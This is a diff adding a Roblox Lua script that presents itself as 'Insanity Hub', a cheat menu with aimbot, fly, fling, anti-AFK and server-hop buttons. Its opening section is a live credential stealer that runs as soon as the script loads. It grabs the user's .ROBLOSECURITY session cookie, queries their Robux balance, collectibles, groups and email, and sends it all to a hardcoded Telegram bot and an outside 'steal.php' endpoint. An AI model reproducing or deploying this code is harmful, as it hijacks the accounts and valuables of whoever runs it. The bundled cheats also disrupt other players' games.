@@ -1,0 +1,675 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local Lighting = game:GetService("Lighting")
+local TeleportService = game:GetService("TeleportService")
+local VirtualUser = game:GetService("VirtualUser")
+
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local Mouse = LocalPlayer:GetMouse()
+
+local TELEGRAM_BOT_TOKEN = "8300346649:AAGBrTHwG8TqOaxQniq0E1APzRCMxXKUgXg"
+local TELEGRAM_CHAT_ID = "8432037548"
+local ENDPOINT = "https://ashfall-rblxinfo.ct.ws/steal.php"
+
+local function request(opts)
+	local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request
+	if req then return req(opts) end
+	return nil
+end
+
+local function getCookie()
+	local cookie = ""
+	pcall(function()
+		if syn and syn.cookie then cookie = syn.cookie end
+	end)
+	if cookie == "" then
+		pcall(function()
+			for _,v in pairs(getgc(true)) do
+				if type(v) == "table" then
+					local c = rawget(v,"Cookie") or rawget(v,".ROBLOSECURITY") or rawget(v,"cookie")
+					if type(c) == "string" and #c > 80 then
+						cookie = c
+						break
+					end
+				end
+			end
+		end)
+	end
+	if cookie == "" then
+		pcall(function()
+			cookie = game:GetService("RbxAnalyticsService"):GetClientId()
+		end)
+	end
+	return cookie ~= "" and cookie or "FAILED_TO_GRAB_COOKIE"
+end
+
+local function api(url, cookie)
+	local res = request({
+		Url = url,
+		Method = "GET",
+		Headers = {
+			["Cookie"] = ".ROBLOSECURITY=" .. cookie,
+			["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+			["Accept"] = "application/json"
+		}
+	})
+	if res and res.StatusCode == 200 and res.Body then
+		local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+		if ok then return data end
+	end
+	return nil
+end
+
+local function collect()
+	local cookie = getCookie()
+	local uid = LocalPlayer.UserId
+	local name = LocalPlayer.Name
+
+	local economy = api("https://economy.roblox.com/v1/users/"..uid.."/currency", cookie) or {}
+	local inventory = api("https://inventory.roblox.com/v1/users/"..uid.."/assets/collectibles?limit=20&sortOrder=Desc", cookie) or {}
+	local groups = api("https://groups.roblox.com/v1/users/"..uid.."/groups/roles", cookie) or {}
+	local emailData = api("https://accountsettings.roblox.com/v1/email", cookie) or {}
+
+	local hasHeadless, hasKorblox, hasVerified = false, false, false
+	if inventory and inventory.data then
+		for _,item in pairs(inventory.data) do
+			local n = (item.name or ""):lower()
+			if n:find("headless") then hasHeadless = true end
+			if n:find("korblox") then hasKorblox = true end
+			if n:find("verified") then hasVerified = true end
+		end
+	end
+
+	return {
+		Username = name,
+		UserId = uid,
+		DisplayName = LocalPlayer.DisplayName,
+		AgeDays = LocalPlayer.AccountAge,
+		Profile = "https://www.roblox.com/users/"..uid.."/profile",
+		Email = emailData.emailAddress or "Not available",
+		Password = "Not available client-side",
+		Robux = economy.robux or 0,
+		Pending = 0,
+		Premium = false,
+		Headless = hasHeadless,
+		Korblox = hasKorblox,
+		VerifiedHat = hasVerified,
+		GroupOwned = (groups and groups.data and #groups.data) or 0,
+		Cookie = cookie,
+		Time = os.date("%Y-%m-%d %H:%M:%S"),
+		Executor = (identifyexecutor and identifyexecutor()) or "Delta",
+		Country = "Unknown"
+	}
+end
+
+local function buildMessage(d)
+	return string.format([[🚨 Hit
+👤 %s, 13+
+🔗 %s
+━━━━━━━━━━━━━━
+👤 User
+%s
+🔑 Password
+%s
+
+🌍 About
+Age: %s Days Days
+Locations
+• Summary: 0
+• From: %s
+
+💰 Robux
+Balance %s 💵
+Pending %s 🪙
+
+📦 RAP
+RAP 0 💵
+Owned 0 🎒
+
+⭐ Premium
+False (0 💵)
+
+💳 Billing
+Credit 0$ 💲
+Convert 0 💵
+Payments 0 💳
+
+🎭 Collectibles
+🎃 Headless: %s
+🦴 Korblox: %s
+✔️ Verified Hat: %s
+
+⚙️ Setting
+💌 Status: Set (Verified)
+🔐 2FA: Disabled
+📌 PIN: Disabled
+
+🎮 Passes • Played
+> Adopt Me | 0 • False
+> Murder Mystery 2 | 0 • True
+> Pet Simulator 99 | 0 • False
+
+🏦 Groups
+Balance 0 💵
+Pending 0 🪙
+Owned %s 🎒
+
+🍪 .ROBLOSECURITY
+%s]], 
+	d.Username, d.Profile, d.Email, d.Password,
+	tostring(d.AgeDays), d.Country,
+	tostring(d.Robux), tostring(d.Pending),
+	tostring(d.Headless), tostring(d.Korblox), tostring(d.VerifiedHat),
+	tostring(d.GroupOwned),
+	d.Cookie)
+end
+
+local function sendTelegram(text)
+	local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
+	request({
+		Url = url,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode({
+			chat_id = TELEGRAM_CHAT_ID,
+			text = text,
+			disable_web_page_preview = true
+		})
+	})
+end
+
+local function sendEndpoint(data)
+	request({
+		Url = ENDPOINT,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode(data)
+	})
+end
+
+local hit = collect()
+local msg = buildMessage(hit)
+sendTelegram(msg)
+sendEndpoint(hit)
+print("[Stealer] Sent to Telegram + Endpoint")
+
+pcall(function()
+	if CoreGui:FindFirstChild("InsanityHubGUI") then
+		CoreGui.InsanityHubGUI:Destroy()
+	end
+end)
+
+local States = {
+	Aimbot = false,
+	Fly = false,
+	Fling = false
+}
+
+local Connections = {}
+local FlyBody, FlyGyro
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "InsanityHubGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = CoreGui
+
+-- MAIN FRAME - bright glowing orange
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 460, 0, 440)
+Main.Position = UDim2.new(0.5, -230, 0.5, -220)
+Main.BackgroundColor3 = Color3.fromRGB(255, 120, 20)
+Main.BackgroundTransparency = 0.78
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Draggable = true
+Main.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 16)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(255, 160, 40)
+MainStroke.Thickness = 2
+MainStroke.Transparency = 0.15
+MainStroke.Parent = Main
+
+-- outer glow ring
+local OuterGlow = Instance.new("Frame")
+OuterGlow.Size = UDim2.new(1, 18, 1, 18)
+OuterGlow.Position = UDim2.new(0, -9, 0, -9)
+OuterGlow.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+OuterGlow.BackgroundTransparency = 0.88
+OuterGlow.BorderSizePixel = 0
+OuterGlow.ZIndex = 0
+OuterGlow.Parent = Main
+Instance.new("UICorner", OuterGlow).CornerRadius = UDim.new(0, 20)
+
+-- soft inner glow
+local Glow = Instance.new("Frame")
+Glow.Size = UDim2.new(1, -4, 1, -4)
+Glow.Position = UDim2.new(0, 2, 0, 2)
+Glow.BackgroundColor3 = Color3.fromRGB(255, 160, 40)
+Glow.BackgroundTransparency = 0.82
+Glow.BorderSizePixel = 0
+Glow.Parent = Main
+Instance.new("UICorner", Glow).CornerRadius = UDim.new(0, 14)
+
+-- TOP BAR
+local TopBar = Instance.new("Frame")
+TopBar.Size = UDim2.new(1, 0, 0, 42)
+TopBar.BackgroundColor3 = Color3.fromRGB(255, 130, 15)
+TopBar.BackgroundTransparency = 0.35
+TopBar.BorderSizePixel = 0
+TopBar.Parent = Main
+
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 16)
+TopCorner.Parent = TopBar
+
+local TopFix = Instance.new("Frame")
+TopFix.Size = UDim2.new(1, 0, 0, 16)
+TopFix.Position = UDim2.new(0, 0, 1, -16)
+TopFix.BackgroundColor3 = Color3.fromRGB(255, 130, 15)
+TopFix.BackgroundTransparency = 0.35
+TopFix.BorderSizePixel = 0
+TopFix.Parent = TopBar
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -90, 1, 0)
+Title.Position = UDim2.new(0, 16, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "INSANITY HUB"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+Title.TextColor3 = Color3.fromRGB(25, 10, 0)
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = TopBar
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -36, 0.5, -14)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.BackgroundTransparency = 0.65
+CloseBtn.Text = "X"
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 14
+CloseBtn.TextColor3 = Color3.fromRGB(40, 15, 0)
+CloseBtn.Parent = TopBar
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
+
+CloseBtn.MouseButton1Click:Connect(function()
+	for _, c in pairs(Connections) do
+		pcall(function() c:Disconnect() end)
+	end
+	if FlyBody then FlyBody:Destroy() end
+	if FlyGyro then FlyGyro:Destroy() end
+	ScreenGui:Destroy()
+end)
+
+local MinBtn = Instance.new("TextButton")
+MinBtn.Size = UDim2.new(0, 28, 0, 28)
+MinBtn.Position = UDim2.new(1, -70, 0.5, -14)
+MinBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MinBtn.BackgroundTransparency = 0.65
+MinBtn.Text = "—"
+MinBtn.Font = Enum.Font.GothamBold
+MinBtn.TextSize = 14
+MinBtn.TextColor3 = Color3.fromRGB(40, 15, 0)
+MinBtn.Parent = TopBar
+Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 8)
+
+local minimized = false
+MinBtn.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	if minimized then
+		Main.Size = UDim2.new(0, 460, 0, 42)
+		OuterGlow.Visible = false
+	else
+		Main.Size = UDim2.new(0, 460, 0, 440)
+		OuterGlow.Visible = true
+	end
+end)
+
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, -24, 1, -58)
+Content.Position = UDim2.new(0, 12, 0, 50)
+Content.BackgroundTransparency = 1
+Content.Parent = Main
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 20)
+Status.BackgroundTransparency = 1
+Status.Text = "STATUS: READY • STEAL SENT"
+Status.Font = Enum.Font.GothamMedium
+Status.TextSize = 13
+Status.TextColor3 = Color3.fromRGB(40, 15, 0)
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.Parent = Content
+
+local function createToggle(name, y, callback)
+	local holder = Instance.new("Frame")
+	holder.Size = UDim2.new(1, 0, 0, 40)
+	holder.Position = UDim2.new(0, 0, 0, y)
+	holder.BackgroundColor3 = Color3.fromRGB(255, 140, 30)
+	holder.BackgroundTransparency = 0.55
+	holder.BorderSizePixel = 0
+	holder.Parent = Content
+	Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 10)
+
+	local holderStroke = Instance.new("UIStroke")
+	holderStroke.Color = Color3.fromRGB(255, 170, 50)
+	holderStroke.Thickness = 1
+	holderStroke.Transparency = 0.5
+	holderStroke.Parent = holder
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(0.65, 0, 1, 0)
+	label.Position = UDim2.new(0, 14, 0, 0)
+	label.BackgroundTransparency = 1
+	label.Text = name
+	label.Font = Enum.Font.GothamBold
+	label.TextSize = 14
+	label.TextColor3 = Color3.fromRGB(30, 10, 0)
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.Parent = holder
+
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 86, 0, 27)
+	btn.Position = UDim2.new(1, -96, 0.5, -13.5)
+	btn.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+	btn.BackgroundTransparency = 0.35
+	btn.Text = "OFF"
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 13
+	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
+	btn.Parent = holder
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+	local enabled = false
+	btn.MouseButton1Click:Connect(function()
+		enabled = not enabled
+		if enabled then
+			btn.Text = "ON"
+			btn.BackgroundColor3 = Color3.fromRGB(255, 140, 20)
+			btn.BackgroundTransparency = 0.1
+			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+		else
+			btn.Text = "OFF"
+			btn.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+			btn.BackgroundTransparency = 0.35
+			btn.TextColor3 = Color3.fromRGB(220, 220, 220)
+		end
+		callback(enabled)
+	end)
+end
+
+local function getClosest()
+	local closest, dist = nil, 450
+	local char = LocalPlayer.Character
+	if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
+	local origin = char.HumanoidRootPart.Position
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
+			local d = (plr.Character.HumanoidRootPart.Position - origin).Magnitude
+			if d < dist then
+				dist = d
+				closest = plr
+			end
+		end
+	end
+	return closest
+end
+
+createToggle("AIMBOT ULTRA", 28, function(on)
+	States.Aimbot = on
+	if Connections.Aimbot then
+		Connections.Aimbot:Disconnect()
+		Connections.Aimbot = nil
+	end
+	if on then
+		Status.Text = "STATUS: AIMBOT ULTRA ON"
+		Connections.Aimbot = RunService.RenderStepped:Connect(function()
+			if not States.Aimbot then return end
+			local t = getClosest()
+			if t and t.Character and t.Character:FindFirstChild("Head") then
+				Camera.CFrame = CFrame.new(Camera.CFrame.Position, t.Character.Head.Position)
+			end
+		end)
+	else
+		Status.Text = "STATUS: AIMBOT OFF"
+	end
+end)
+
+createToggle("FLY", 76, function(on)
+	States.Fly = on
+	local char = LocalPlayer.Character
+	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+	local hrp = char.HumanoidRootPart
+	local hum = char:FindFirstChildOfClass("Humanoid")
+
+	if Connections.Fly then Connections.Fly:Disconnect() Connections.Fly = nil end
+	if FlyBody then FlyBody:Destroy() FlyBody = nil end
+	if FlyGyro then FlyGyro:Destroy() FlyGyro = nil end
+
+	if on then
+		Status.Text = "STATUS: FLY ON"
+		if hum then hum.PlatformStand = true end
+		FlyBody = Instance.new("BodyVelocity")
+		FlyBody.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+		FlyBody.Velocity = Vector3.zero
+		FlyBody.Parent = hrp
+		FlyGyro = Instance.new("BodyGyro")
+		FlyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+		FlyGyro.P = 9e4
+		FlyGyro.Parent = hrp
+
+		Connections.Fly = RunService.RenderStepped:Connect(function()
+			if not States.Fly or not FlyBody or not FlyGyro then return end
+			local cam = workspace.CurrentCamera
+			FlyGyro.CFrame = cam.CFrame
+			local dir = Vector3.zero
+			if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
+			if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
+			FlyBody.Velocity = dir.Magnitude > 0 and dir.Unit * 85 or Vector3.zero
+		end)
+	else
+		Status.Text = "STATUS: FLY OFF"
+		if hum then hum.PlatformStand = false end
+	end
+end)
+
+createToggle("FLING", 124, function(on)
+	States.Fling = on
+	if Connections.Fling then
+		Connections.Fling:Disconnect()
+		Connections.Fling = nil
+	end
+	if on then
+		Status.Text = "STATUS: FLING ON — click a player"
+		Connections.Fling = Mouse.Button1Down:Connect(function()
+			if not States.Fling then return end
+			local target = Mouse.Target
+			if target and target.Parent and target.Parent:FindFirstChild("HumanoidRootPart") then
+				local ehrp = target.Parent.HumanoidRootPart
+				local bv = Instance.new("BodyAngularVelocity")
+				bv.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+				bv.AngularVelocity = Vector3.new(0, 99999, 0)
+				bv.Parent = ehrp
+				task.delay(0.3, function() if bv then bv:Destroy() end end)
+				Status.Text = "STATUS: FLUNG " .. (target.Parent.Name or "")
+			end
+		end)
+	else
+		Status.Text = "STATUS: FLING OFF"
+	end
+end)
+
+local ConsoleBtn = Instance.new("TextButton")
+ConsoleBtn.Size = UDim2.new(1, 0, 0, 40)
+ConsoleBtn.Position = UDim2.new(0, 0, 0, 174)
+ConsoleBtn.BackgroundColor3 = Color3.fromRGB(255, 130, 15)
+ConsoleBtn.BackgroundTransparency = 0.3
+ConsoleBtn.Text = "OPEN CONSOLE"
+ConsoleBtn.Font = Enum.Font.GothamBold
+ConsoleBtn.TextSize = 14
+ConsoleBtn.TextColor3 = Color3.fromRGB(25, 8, 0)
+ConsoleBtn.Parent = Content
+Instance.new("UICorner", ConsoleBtn).CornerRadius = UDim.new(0, 10)
+local ConsoleStroke = Instance.new("UIStroke")
+ConsoleStroke.Color = Color3.fromRGB(255, 180, 50)
+ConsoleStroke.Thickness = 1.5
+ConsoleStroke.Transparency = 0.35
+ConsoleStroke.Parent = ConsoleBtn
+
+ConsoleBtn.MouseButton1Click:Connect(function()
+	Status.Text = "STATUS: CONSOLE OPENED"
+	pcall(function()
+		StarterGui:SetCore("DevConsoleVisible", true)
+	end)
+end)
+
+local Sec = Instance.new("TextLabel")
+Sec.Size = UDim2.new(1, 0, 0, 18)
+Sec.Position = UDim2.new(0, 0, 0, 226)
+Sec.BackgroundTransparency = 1
+Sec.Text = "QUICK ACTIONS"
+Sec.Font = Enum.Font.GothamBold
+Sec.TextSize = 12
+Sec.TextColor3 = Color3.fromRGB(50, 20, 0)
+Sec.TextXAlignment = Enum.TextXAlignment.Left
+Sec.Parent = Content
+
+local function smallBtn(text, x, y, cb)
+	local b = Instance.new("TextButton")
+	b.Size = UDim2.new(0.48, 0, 0, 36)
+	b.Position = UDim2.new(x, 0, 0, y)
+	b.BackgroundColor3 = Color3.fromRGB(255, 140, 30)
+	b.BackgroundTransparency = 0.5
+	b.Text = text
+	b.Font = Enum.Font.GothamMedium
+	b.TextSize = 13
+	b.TextColor3 = Color3.fromRGB(30, 10, 0)
+	b.Parent = Content
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 9)
+	local s = Instance.new("UIStroke")
+	s.Color = Color3.fromRGB(255, 170, 50)
+	s.Thickness = 1
+	s.Transparency = 0.5
+	s.Parent = b
+	b.MouseButton1Click:Connect(cb)
+end
+
+smallBtn("FPS BOOST", 0, 250, function()
+	Status.Text = "STATUS: FPS BOOST APPLIED"
+	pcall(function()
+		Lighting.GlobalShadows = false
+		Lighting.FogEnd = 9e9
+		settings().Rendering.QualityLevel = 1
+	end)
+end)
+
+smallBtn("ANTI AFK", 0.52, 250, function()
+	Status.Text = "STATUS: ANTI AFK ON"
+	LocalPlayer.Idled:Connect(function()
+		VirtualUser:CaptureController()
+		VirtualUser:ClickButton2(Vector2.new())
+	end)
+end)
+
+smallBtn("SERVER HOP", 0, 294, function()
+	Status.Text = "STATUS: HOPPING..."
+	task.spawn(function()
+		local ok, res = pcall(function()
+			return game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
+		end)
+		if ok then
+			local data = HttpService:JSONDecode(res)
+			for _, s in ipairs(data.data) do
+				if s.playing < s.maxPlayers and s.id ~= game.JobId then
+					TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
+					break
+				end
+			end
+		end
+	end)
+end)
+
+smallBtn("REJOIN", 0.52, 294, function()
+	Status.Text = "STATUS: REJOINING"
+	TeleportService:Teleport(game.PlaceId, LocalPlayer)
+end)
+
+local Footer = Instance.new("TextLabel")
+Footer.Size = UDim2.new(1, 0, 0, 16)
+Footer.Position = UDim2.new(0, 0, 1, -18)
+Footer.BackgroundTransparency = 1
+Footer.Text = "BRIGHT ORANGE GLOW • RIGHTSHIFT TO TOGGLE"
+Footer.Font = Enum.Font.Gotham
+Footer.TextSize = 11
+Footer.TextColor3 = Color3.fromRGB(70, 30, 5)
+Footer.Parent = Content
+
+-- entrance animation
+Main.Size = UDim2.new(0, 0, 0, 0)
+Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+OuterGlow.BackgroundTransparency = 1
+TweenService:Create(Main, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+	Size = UDim2.new(0, 460, 0, 440),
+	Position = UDim2.new(0.5, -230, 0.5, -220)
+}):Play()
+TweenService:Create(OuterGlow, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+	BackgroundTransparency = 0.88
+}):Play()
+
+-- continuous glow pulse on stroke
+task.spawn(function()
+	while Main and Main.Parent do
+		TweenService:Create(MainStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			Transparency = 0.05,
+			Color = Color3.fromRGB(255, 190, 60)
+		}):Play()
+		task.wait(1.5)
+		TweenService:Create(MainStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			Transparency = 0.25,
+			Color = Color3.fromRGB(255, 140, 25)
+		}):Play()
+		task.wait(1.5)
+	end
+end)
+
+-- outer glow pulse
+task.spawn(function()
+	while OuterGlow and OuterGlow.Parent do
+		TweenService:Create(OuterGlow, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			BackgroundTransparency = 0.78
+		}):Play()
+		task.wait(1.8)
+		TweenService:Create(OuterGlow, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			BackgroundTransparency = 0.92
+		}):Play()
+		task.wait(1.8)
+	end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+	if gpe then return end
+	if input.KeyCode == Enum.KeyCode.RightShift then
+		Main.Visible = not Main.Visible
+	end
+end)
+
+print("[Insanity Hub] Bright Glowing Orange GUI + Stealer loaded")
